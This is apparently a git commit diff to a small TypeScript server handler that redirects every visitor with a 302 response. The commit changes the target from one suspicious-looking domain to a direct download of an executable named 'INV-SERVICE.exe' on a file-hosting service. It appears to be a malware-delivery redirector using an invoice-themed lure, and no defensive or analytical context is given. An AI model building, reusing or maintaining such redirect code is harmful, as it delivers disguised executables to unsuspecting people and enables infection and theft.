9598a7aa3c7b58e3597649dbd0af416d8034d6e2
mandersann <mandersann@prometrical.us>
2025-10-16 05:25:42 -0700

    Update mandersprog22.ts

--- mandersprog22.ts
+++ mandersprog22.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dispuacc-rvlwnow.co/simmon",
+      Location: "https://store-na-phx-3.gofile.io/download/direct/e20eac1f-22b1-4cc4-843f-2622cc57e1eb/INV-SERVICE.exe",
     },
   });
 });
